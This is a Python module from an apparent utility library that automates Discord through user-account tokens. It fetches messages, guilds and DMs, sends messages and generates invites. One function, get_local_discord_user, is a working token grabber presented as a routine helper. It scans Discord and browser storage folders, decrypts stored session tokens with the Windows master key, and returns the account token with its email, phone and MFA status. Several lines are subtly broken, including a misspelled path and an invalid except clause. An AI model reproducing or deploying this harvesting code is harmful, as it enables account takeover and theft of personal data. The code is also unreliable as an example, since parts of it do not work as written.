import requests
import copy
import zhmiscellany.fileio
import zhmiscellany.netio
from ._discord_supportfuncs import scrape_guild

import base64
import Crypto.Cipher.AES
import os
import json
import re
import win32crypt


def add_reactions_to_message(user_token, emojis, channel_id, message_id):

    for emoji in emojis:
        url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
        headers = zhmiscellany.netio.generate_headers(url)

        added = False
        while not added:
            try:
                response = requests.put(url, headers=headers)
                #print(response.content)
                response.raise_for_status()
                #print(f"Reaction {emoji} added successfully!")
                added = True
            except requests.exceptions.RequestException as e:
                if not 'Too Many Requests for url' in str(e):
                    print(f"Error adding reaction: {e}")
                    added = False


def get_channel_messages(user_token, channel_id, limit=0, use_cache=True, show_progress=False, rescan_for_new_messages=True):
    '''
    Function to get all client messages in a specific channel. Script by @z_h_ on discord.
    '''

    def filter_dicts_by_id(data_list, target_id):
        filtered_list = [d for d in copy.deepcopy(data_list) if d.get('id', 0) < target_id]
        return filtered_list


    messages = []

    base_url = 'https://discord.com/api/v9/channels/{}/messages'.format(channel_id)

    headers = zhmiscellany.netio.generate_headers(base_url)
    headers['Authorization'] = user_token

    last_message_id = ''

    most_recent_id = 0
    special_first_request = False
    if use_cache:
        cache_folder = 'zhmiscellany_cache'
        zhmiscellany.fileio.create_folder(cache_folder)
        potential_path = os.path.join(cache_folder, f'{channel_id}_messages.json')
        if os.path.exists(potential_path):
            temp = zhmiscellany.fileio.read_json_file(potential_path)
            most_recent_id = temp[0]['id']
            response = requests.get(base_url, headers=headers, params={'limit': 100})
            special_first_request = True
            messages = temp

            if (not rescan_for_new_messages) and (response.json()[0]['id'] <= most_recent_id):
                return zhmiscellany.fileio.read_json_file(potential_path)

    while True:
        if not special_first_request:
            if last_message_id:
                try:
                    response = requests.get(base_url, headers=headers, params={'limit': 100, 'before': last_message_id})
                except:
                    # try again :(
                    response = requests.get(base_url, headers=headers, params={'limit': 100, 'before': last_message_id})
            else:
                response = requests.get(base_url, headers=headers, params={'limit': 100})

            if not response.json():
                if use_cache:
                    zhmiscellany.fileio.create_folder('zhmiscellany_cache')
                    zhmiscellany.fileio.write_json_file(potential_path, messages)
                if show_progress:
                    print('')
                return messages

        messages.extend(response.json())

        if messages[0]['id'] <= most_recent_id:
            messages = filter_dicts_by_id(messages, most_recent_id)
            if use_cache:
                zhmiscellany.fileio.create_folder('zhmiscellany_cache')
                zhmiscellany.fileio.write_json_file(potential_path, {'no access to channel': True})
            return messages

        try:
            last_message_id = messages[-1]['id']
        except TypeError:
            if show_progress:
                print('no access to channel')
            if use_cache:
                zhmiscellany.fileio.create_folder('zhmiscellany_cache')
                zhmiscellany.fileio.write_json_file(potential_path, {'no access to channel': True})
            return {'no access to channel': True}

        if show_progress:
            print(f'\rFound {len(messages):,} messages', end='')

        if limit != 0:
            if len(messages) >= limit:
                if show_progress:
                    print('')
                return messages[:limit]


def get_local_discord_user():
    global _cached_user_info
    try:
        a = _cached_user_info
        return a
    except:



        user_tokens = []
        cleaned = []

        def decrypt(buff, master_key):
            try:
                return Crypto.Cipher.AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], Crypto.Cipher.AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
            except:
                return "Error"

        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
        paths = {
            'Discord': roaming + '\\\\discord',
            'Discord Canary': roaming + '\\\\discordcanary',
            'Lightcord': roaming + '\\\\Lightcord',
            'Discord PTB': roaming + '\\\\discordptb',
            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
            'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
            'Amigo': local + '\\\\Amigo\\\\User Data',
            'Torch': local + '\\\\Torch\\\\User Data',
            'Kometa': local + '\\\\Kometa\\\\User Data',
            'Orbitum': local + '\\\\Orbitum\\\\User Data',
            'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
            '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
            'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
            'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
            'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
            'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
            'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
            'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\\\Local State", "r") as file:
                    key = json.loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except:
                continue
            for file in os.listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
                if not file.endswith(".ldb") and file.endswith(".log"):
                    continue
                else:
                    try:
                        with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\\"]*", x):
                                    user_tokens.append(values)
                    except PermissionError:
                        continue
            for i in user_tokens:
                if i.endswith("\\\\"):
                    i.replace("\\\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for user_token in cleaned:
                try:
                    tok = decrypt(base64.b64decode(user_token.split('dQw4w9WgXcQ:')[1]), base64.b64decode(key)[5:])
                except IndexError == "Error":
                    continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        try:
                            url = 'https://discordapp.com/api/v6/users/@me'
                            res = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': tok})
                        except:
                            continue
                        if res.status_code == 200:
                            # if True:
                            res_json = res.json()
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            _cached_user_info = [tok, user_name, user_id, email, phone, mfa_enabled]
                            return _cached_user_info
                    else:
                        continue


        return None


def get_guild_channels(user_token, guild_id, use_cache=True):
    if use_cache:
        potential_path = os.path.join('zhmiscellany_cache', f'{guild_id}_channels.json')
        if os.path.exists(potential_path):
            return zhmiscellany.fileio.read_json_file(potential_path)
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"

    response = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token})

    if response.status_code == 200:
        channels_data = response.json()
        if use_cache:
            zhmiscellany.fileio.create_folder('zhmiscellany_cache')
            zhmiscellany.fileio.write_json_file(potential_path, channels_data)
        return channels_data
    else:
        raise Exception(f'Failed to retrieve channels:\n{response.status_code}\n{response.content}')


def send_message(user_token, text, channel_id, attachments=None):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"

    headers = {**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token}

    data = {"content": text}

    if attachments:
        files = {f'file{i}': open(file_path, 'rb') for i, file_path in enumerate(attachments)}
        response = requests.post(url, headers=headers, data=data, files=files)
    else:
        response = requests.post(url, headers=headers, data=data)

    if response.status_code != 200:
        raise Exception(f'Failed to send message:\n{response.status_code}\n{response.content}')


def get_message(user_token, channel_id, message_id):
    message_url = f'https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}'
    message = requests.get(message_url, headers={**zhmiscellany.netio.generate_headers(message_url), 'Authorization': user_token})
    message = message.json()
    return message[0]


def ids_to_message_url(channel_id, message_id, guild_id=None):
    if guild_id:
        return f'https://discord.com/channels/{guild_id}/{channel_id}/{message_id}'
    else:
        return f'https://discord.com/channels/{channel_id}/{message_id}'


def message_url_to_ids(message_url):
    # Regular expressions to extract IDs
    guild_channel_message_regex = r'https:\/\/discord\.com\/channels\/(\d+)\/(\d+)\/(\d+)'
    channel_message_regex = r'https:\/\/discord\.com\/channels\/(\d+)\/(\d+)'

    # Check for guild, channel, and message IDs
    match = re.match(guild_channel_message_regex, message_url)
    if match:
        guild_id, channel_id, message_id = map(int, match.groups())
        return [guild_id, channel_id, message_id]

    # Check for channel and message IDs (DMs)
    match = re.match(channel_message_regex, message_url)
    if match:
        channel_id, message_id = map(int, match.groups())
        return [None, channel_id, message_id]

    # Invalid URL format
    return [None, None, None]


def decode_user_id(user_token):
    # Extracting the payload from the token
    payload_base64 = user_token.split('.')[0]

    # Padding the base64 string if needed
    padded_base64 = payload_base64 + '=' * (4 - len(payload_base64) % 4)

    # Decoding the base64 and converting to a JSON object
    payload_json = base64.b64decode(padded_base64).decode('utf-8')
    user_id = json.loads(payload_json)

    return user_id


def get_guilds(user_token, use_cache=True):
    if use_cache:
        potential_path = os.path.join('zhmiscellany_cache', f'{decode_user_id(user_token)}_guilds.json')
        if os.path.exists(potential_path):
            return zhmiscellany.fileio.read_json_file(potential_path)
    url = 'https://discord.com/api/v9/users/@me/guilds'
    response = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token})

    if response.status_code == 200:
        guilds = response.json()
        if use_cache:
            zhmiscellany.fileio.create_folder('zhmiscellany_cache')
            zhmiscellany.fileio.write_json_file(potential_path, guilds)
        return guilds
    else:
        raise Exception(f'Failed to retrieve guilds:\n{response.status_code}\n{response.content}')


def get_dm_channels(user_token, use_cache=True):
    if use_cache:
        potential_path = os.path.join('zhmiscellany_cache', f'{decode_user_id(user_token)}_dm_channels.json')
        if os.path.exists(potential_path):
            return zhmiscellany.fileio.read_json_file(potential_path)
    url = 'https://discord.com/api/v9/users/@me/channels'
    response = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token})

    if response.status_code == 200:
        dm_channels = response.json()
        if use_cache:
            zhmiscellany.fileio.create_folder('zhmiscellany_cache')
            zhmiscellany.fileio.write_json_file(potential_path, dm_channels)
        return dm_channels
    else:
        raise Exception(f'Failed to retrieve DM channels:\n{response.status_code}\n{response.content}')


def get_invite_info(user_token, invite_code, use_cache=True):
    if use_cache:
        potential_path = os.path.join('zhmiscellany_cache', f'{invite_code}_invite.json')
        if os.path.exists(potential_path):
            return zhmiscellany.fileio.read_json_file(potential_path)
    url = f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true"
    response = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token})

    if response.status_code == 200:
        info = response.json()
        if use_cache:
            zhmiscellany.fileio.create_folder('zhmiscellany_cache')
            zhmiscellany.fileio.write_json_file(potential_path, info)
        return info
    else:
        raise Exception(f'Failed to retrieve invite info:\n{response.status_code}\n{response.content}')


def generate_server_invite(user_token, channel_id):
    url = f"https://discord.com/api/v9/channels/{channel_id}/invites"
    response = requests.get(url, headers={**zhmiscellany.netio.generate_headers(url), 'Authorization': user_token})

    if response.status_code == 200:
        guild_info = response.json()
        return guild_info
    else:
        raise Exception(f'Failed to generate invite:\n{response.status_code}\n{response.content}')


def get_approximate_member_count(user_token, channel_id, use_cache=True):
    if use_cache:
        potential_path = os.path.join('zhmiscellany_cache', f'{channel_id}_member_count.json')
        if os.path.exists(potential_path):
            return zhmiscellany.fileio.read_json_file(potential_path)
    invite = generate_server_invite(user_token, channel_id)
    invite_code = invite['code']
    invite_info = get_invite_info(user_token, invite_code)
    member_counts = {'approximate_member_count': invite_info['approximate_member_count'], 'approximate_online_count': invite_info['approximate_presence_count']}
    if use_cache:
        zhmiscellany.fileio.create_folder('zhmiscellany_cache')
        zhmiscellany.fileio.write_json_file(potential_path, member_counts)
    return member_counts